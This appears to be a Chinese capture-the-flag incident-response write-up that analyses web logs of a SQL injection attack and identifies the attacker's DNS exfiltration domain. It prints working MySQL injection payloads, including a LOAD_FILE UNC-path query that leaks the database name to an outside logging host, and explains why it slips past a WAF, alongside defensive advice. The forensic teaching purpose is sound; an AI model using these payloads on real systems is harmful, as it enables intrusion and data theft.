SQL注入DNS外带数据WriteUp

应急响应 2026-07-08 2433 字 约 6 分钟
SQL注入DNSOOBWriteUp

题目信息

企业安全团队发现 WAF 告警，业务系统遭受大量 SQL 注入扫描。进一步分析发现数据库服务器存在异常的 DNS 查询记录。结合 Web 访问日志，分析攻击者利用何种技术绕过检测并将数据库敏感信息外传。

目标：找出攻击者用于接收数据的域名。

日志概况

统计项 数值
文件 access.log（Apache 访问日志）
时间范围 20/May/2024:14:00:00 ~ 20/May/2024:14:02:30
服务器软件 Apache（Combined Log Format）

攻击链总览

Phase 1: SQL 注入探测 (多IP)
  ├─ 89.248.165.99  → /product?id=1' INTO OUTFILE ...   → 403 (被WAF拦截)
  └─ 46.101.88.33   → /product?id=1' AND SLEEP(1) ...    → 200 (探测成功)

Phase 2: DNS外带数据 (关键攻击)
  └─ 203.0.113.88   → /search?q=[SQL注入+DNS外传Payload] → 200 (绕过WAF提取数据)

详细分析

探测阶段

在日志中发现两条典型的 SQL 注入探测请求：

① INTO OUTFILE 尝试（被拦截）:

89.248.165.99 [14:01:40] GET /product?id=1' INTO OUTFILE '/tmp/out.txt' -- 
Response: 403 (WAF拦截)

② SLEEP 时间盲注探测（成功）:

46.101.88.33 [14:02:00] GET /product?id=1' AND SLEEP(1) --
Response: 200 (注入点存在)

发现 /product 端点存在 SQL 注入但被 WAF 防护。

关键攻击：DNS 外带数据（OOB）

攻击者 203.0.113.88 在 14:02:30 仅用一个请求就完成了数据外传：

GET /search?q=1%27%20AND%20(SELECT%20load_file(concat(%27%5C%5C%5C%5C%27,(select%20database()),%27.p9fin2.dnslog.cn%5C%5Cabc%27)))%20--%20 HTTP/1.1
Host: (目标服务器)

URL 解码后：

1' AND (SELECT load_file(concat('\\\\',(select database()),'.p9fin2.dnslog.cn\\abc'))) --

DNS 外带技术原理

这是利用 MySQL 的 OOB（Out-Of-Band）数据外传 技术，也称为 DNS Exfiltration：

┌─────────────────┐         DNS查询请求          ┌──────────────────┐
│  MySQL 服务器    │ ──────────────────────────→  │   DNS Server     │
│                 │    dbname.p9fin2.dnslog.cn   │  (攻击者控制)    │
│  LOAD_FILE(     │                              │                  │
│   '\\dbname.    │                              │  日志记录:       │
│    p9fin2.      │                              │  dbname.p9fin2. │
│    dnslog.cn    │                              │  dnslog.cn       │
│    \abc'        │                              │                  │
│  )              │                              └──────────────────┘
└─────────────────┘

关键函数与路径

组件 说明
LOAD_FILE() MySQL 读取文件函数，支持 UNC 路径
concat('\\\\', ...) 构造 UNC 路径 \\数据库名.p9fin2.dnslog.cn\abc
(select database()) 要外传的数据库名，嵌入子域名
.p9fin2.dnslog.cn 攻击者控制的接收域名
dnslog.cn 公共 DNS/HTTP 日志平台

为何能绕过 WAF

  1. 单次请求：仅 1 个 HTTP 请求即可完成数据外传
  2. 无回显依赖：不依赖 HTTP 响应内容，数据通过 DNS 通道外传
  3. payload 不包含明显敏感词：LOAD_FILE + UNC 路径格式可能不在 WAF 规则库中
  4. 探测与利用分离：用 46.101.88.33 先确认注入点存在，再用 203.0.113.88 执行 OOB 外传

结论

信息 值
攻击源 IP 203.0.113.88（实际利用）/ 46.101.88.33（探测）
攻击入口 /search?q= 参数
注入类型 SQL 注入（MySQL）
数据外传技术 OOB（Out-Of-Band）DNS Exfiltration
利用函数 LOAD_FILE() + UNC 路径
接收数据的域名 p9fin2.dnslog.cn

防御建议

  1. 参数化查询：所有 SQL 查询使用 Prepared Statement
  2. WAF 规则增强：添加 LOAD_FILE、UNC 路径（\\\\）等规则
  3. 出站 DNS 监控：对内部服务器发起的异常 DNS 查询进行告警
  4. 最小权限：MySQL 运行账户不应有 LOAD_FILE 权限，移除 FILE 权限
  5. 阻断 SMB 出站：防火墙阻止数据库服务器向外的 SMB（445）和 DNS 隧道流量
